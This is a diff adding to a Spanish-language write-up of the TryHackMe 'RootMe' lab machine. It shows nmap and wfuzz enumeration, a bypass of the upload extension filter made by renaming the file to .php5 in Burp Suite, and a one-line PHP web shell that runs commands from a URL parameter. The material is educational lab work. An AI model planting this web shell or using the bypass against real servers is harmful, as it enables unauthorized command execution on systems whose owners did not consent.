@@ -1,6 +1,8 @@
 # RootMe-THM
-Máquina RootMe de TryHackMe en Español
-<img src='https://github.com/user-attachments/assets/0eff2b42-89aa-4a0a-8bfa-998bc57b21b1'></img>
+## Máquina RootMe de TryHackMe en Español
+<p align="center">
+  <img src='https://github.com/user-attachments/assets/0eff2b42-89aa-4a0a-8bfa-998bc57b21b1'></img>
+</p>
 "RootMe" es una máquina en TryHackMe diseñada para desafiar tu ingenio y creatividad al pensar como un atacante. Con un enfoque didáctico, esta máquina es ideal tanto para principiantes como para usuarios de nivel intermedio.
 Utilizamos una variedad de herramientas fundamentales: Nmap, Wfuzz, Wappalyzer, Curl, Netcat, Burp Suite, etc.
 
@@ -46,3 +48,54 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 Este comando escanea los puertos 22 y 80, utilizando scripts estándar `-sC` y detección de versiones `-sV`. Dado que el puerto 22 está abierto, se puede investigar más sobre posibles credenciales para SSH, pero el foco principal será investigar el servicio HTTP en el puerto 80.
+
+----------------------------
+## Fase de Enumeración
+Enfocado en el puerto 80, que aloja un servidor web. Usando `Wappalyzer` se detecto que la aplicación web está construida con `PHP` y corre sobre un servidor `Apache`.
+<p align="center">
+  <img src='https://github.com/user-attachments/assets/bd48cefc-6700-4fdc-bbd2-1db71ae98a35'></img>
+</p>
+Igualmente al inspeccionar la página con las herramientas de desarrollo del navegador, encontramos una cookie de sesión llamada `PHPSESSID`, que te puede confirmar el uso de `PHP` en la aplicación.
+<p align="center">
+  <img src='https://github.com/user-attachments/assets/28b45b91-430d-4e32-aa10-8b70c413febd'></img>
+</p>
+Para encontrar directorios ocultos en el servidor, utilicé la herramienta de fuzzing `wfuzz` que nos permite hacer fuerza bruta para descubrir recursos no visibles desde la interfaz pública del sitio
+
+```
+wfuzz -c --hc=404 -t 15 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.244.159/FUZZ
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                    
+=====================================================================
+000000164:   301        9 L      28 W       316 Ch      "uploads"                              
+000000550:   301        9 L      28 W       312 Ch      "css"
+000000953:   301        9 L      28 W       311 Ch      "js"
+000005520:   301        9 L      28 W       314 Ch      "panel"  
+```
+Una explicacion de Explicación del Comando de `Wfuzz`:
+`-c` muestra la salida en colores, `--hc=404` filtra las respuestas que devuelven un código HTTP 404, `-t 15` usa 15 hilos para realizar las solicitudes en paralelo, acelerando este proceso, `-w` Especifica el diccionario a usar, en este caso uno que contiene nombres comunes de directorios.
+
+Despues de investigar cada rutas encontradas `/uploads` se encontro un panel que permite la carga de archivos, lo que puede ser un punto de entrada letal si no está asegurado correctamente.
+<p align="center">
+  <img src='https://github.com/user-attachments/assets/eace86c6-d8d7-4c0d-8c7b-0d8c6c39623a'/>
+</p>
+
+-------------------------------------------
+## Fase de Explotación
+Se intenta subir un archivo `PHP`, pero respondió con un mensaje de "archivo no permitido". Me da entender que el servidor tiene un filtrado para impedir la carga de archivos con ciertas extensiones peligrosas, como `.php`.
+<p align="center">
+  <img src='https://github.com/user-attachments/assets/c644f5a9-c527-4ffd-b91c-a2da30ab527c'/>
+</p>
+
+Una idea seria realizar una evasión de restricciones de extensiones. En HackTricks, investigando que PHP puede ser ejecutado a través de varias extensiones no tradicionales, como `.php5`. Esto significa que incluso si el servidor bloquea la extensión `.php`, otras variantes podrían no estar restringidas. Para explotar esta posible via, intercepto la solicitud HTTP usando `Burp Suite`
+<p align="center">
+  <img src='https://github.com/user-attachments/assets/e0380fac-bb4b-4b06-9f79-fdff2c4a8f1c'/>
+</p>
+Modificando el nombre del archivo en el encabezado `Content-Disposition` a `shellico.php5`. Esta técnica de modificar la extensión en el momento del envío permite evadir la protección basada en la extensión del archivo. Con este script `RCE` en php.
+
+```
+<?php
+ system($_GET["cmd"]);
+?>
+```
+Este script permite ejecutar comandos del sistema en el servidor al pasar el parámetro `"cmd"` en la URL. La exitosa respuesta confirma que el servidor acepta y ejecuta archivos con la extensión .php5.
